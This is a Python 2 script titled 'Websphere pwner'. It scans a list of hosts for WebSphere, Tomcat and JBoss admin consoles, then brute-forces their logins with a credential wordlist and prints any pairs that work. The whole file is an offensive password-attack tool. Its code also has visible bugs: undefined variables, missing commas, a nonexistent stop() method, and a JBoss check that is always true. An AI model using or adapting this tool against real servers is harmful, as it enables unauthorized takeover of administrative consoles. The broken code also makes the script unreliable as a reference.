import threading
import Queue
import sys
import os
import optparse
import requests
import time
from requests.auth import HTTPBasicAuth
from requests.auth import HTTPDigestAuth


parser = optparse.OptionParser()

parser.add_option("-f", "--file", dest="filename",
				help="Output file of the results", metavar="FILE")
				
(options, args) = parser.parse_args()

filename = options.filename



# colors class
#this class configures the colors for the script


class bgcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[1;32;47m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# banner function

def banner():
    banner = '''
------------------------------------------------------
	+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+
	|W|e|b|s|p|h|e|r|e| |p|w|n|e|r|
	+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+
	         v1.0.1 alpha
------------------------------------------------------
	'''

    print bgcolors.OKBLUE + banner + bgcolors.ENDC

banner()

######################################################################
#-----------------------------[settings]-----------------------------#
######################################################################

# path of the servers
addresses = open("/home/el4zar/Desktop/servers", "r").read().split()

# ----------------------------------wordlist --------------------{

# websphere wordlist
ws_wordlist = open("/home/el4zar/Desktop/wordlist", "r").read().split()

# tomcat wordlist

tc_wordlist = open("/home/el4zar/Desktop/wordlist", "r").read().split()


# websphere wordlist
jb_wordlist = open("/home/el4zar/Desktop/wordlist", "r").read().split()


# ------------------------------------------------------------------ } 


# user agent
headers = {
    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0'}

#--------------------------------------------------------------------


# make session
a = requests.Session()

# Local proxy for debugging with Burp-Suite
proxies = {'http': 'http://127.0.0.1:8080'}

# make queue for each class
queue = Queue.Queue()
queue2 = Queue.Queue()
queue3 = Queue.Queue()
queue4 = Queue.Queue()


# application console paths
paths = ['/console', '/manager/html', '/management']

print "[*] - Searching for servers with webshere, tomcat and jboss"

# websphere brute force class

######################################################################
#--------------------------End of Settings---------------------------#
######################################################################


class BruteForce_ws(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while not self.queue.empty():
            url = queue2.get()
            for word in ws_wordlist:
                # Split each word by the ':' character into two variables
                first_word, second_word = word.split(':')
                # Request parameters to login to websphere
                payload = {'j_username': first_word,
                           'j_password': second_word, 'submit': 'Login'}
                try:
                    # send the request
                    brute_url = a.post(
                        url + "/portal/j_security_check", data=payload, headers=headers)
                    # check if a successfull login was accomplished
                    if (brute_url.status_code == 200) and ('/console/logout.jsp' in brute_url.text):
                        print "\r{}[* Websphere *] - Default password on ip: {} : {}:{}{}".strip("\n").format(bgcolors.OKGREEN, url, first_word, second_word, bgcolors.ENDC)
                except:
                    continue


# Tomcat brute force class
class BruteForce_tc(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while not self.queue.empty():
        	url = queue3.get()
        	for word in tc_wordlist:
        		first_word, second_word = word.split(':')
        		r = requests.get(url, auth=HTTPBasicAuth(first_word, second_word))
        		if r.status_code == 200:
        			print "\r{}[* Tomcat *] - Default password on ip: {} : {}:{}{}".strip("\n").format(bgcolors.OKGREEN, url, first_word, second_word, bgcolors.ENDC)


					
					
# Jboss brute force class # note this is only suitable for jboss 7x and
# Above at the moment
class BruteForce_jb(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while not self.queue.empty():
        	url = queue4.get()
        	for word in jb_wordlist:
        		first_word, second_word = word.split(':')
        		r = requests.get(url, auth=HTTPDigestAuth(first_word, second_word))
        		if r.status_code == 200:
        			print "\r{}[* Jboss *] - Default password on ip: {} : {}:{}{}".strip("\n").format(bgcolors.OKGREEN, url, first_word, second_word, bgcolors.ENDC)


					
# Admin panel search class
class WorkerThread(threading.Thread):

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while not self.queue.empty():
            getips = self.queue.get()
            for path in paths:
                full_path = "http://{}{}".format(getips, path)
                try:
					r = a.get(full, timeout=2, headers=headers)
					# check which kind of service is running on the server: jboss, websphere or tomcat:
					# this check could be improved with more unique checks
					foundmessage = "\r{}[!] - Found server with {} admin console at: {} - starting to bruteforce{}"
					if 'console' in r.url and r.status_code == 200 and 'websphere' in r.text:
						print foundmessage.format(bgcolors.OKBLUE, 'websphere' full_path, bgcolors.ENDC)
						queue2.put(full_path)
					if r.status_code == 401 and '/manager/html' in r.url:
						print foundmessage.format(bgcolors.OKBLUE, 'tomcat' full_path, bgcolors.ENDC)
						queue3.put(full_path)
					if r.status_code == 401 and '/management':
						print foundmessage.format(bgcolors.OKBLUE, 'jboss' full_path, bgcolors.ENDC)
						queue4.put(full_path)
                except:
                    continue



##################################################################################################################
#-----------------------------------------------threads----------------------------------------------------------#
##################################################################################################################

threads = []

for address in addresses:
    queue.put(address)

# call the websphere brute force class
bf = BruteForce_ws()

# start threads at websphere brute force class
bf.start()

# start threads at websphere brute force class
bf1 = BruteForce_jb()
bf1.start()

# start threads at tomcat brute force class
bf2 = BruteForce_tc()
bf2.start()

# start threads  at jboss brute force class
bf3 = BruteForce_jb()
bf3.start()

#The range number configures the amount of threads to spawn 
for i in range(20):
    t = WorkerThread(queue)
    t.start()
    threads.append(t)

queue.join()

for thread in threads:
    thread.join()

bf.stop()
bf.join()

bf2.stop()
bf2.join()

bf3.stop()
bf3.join()
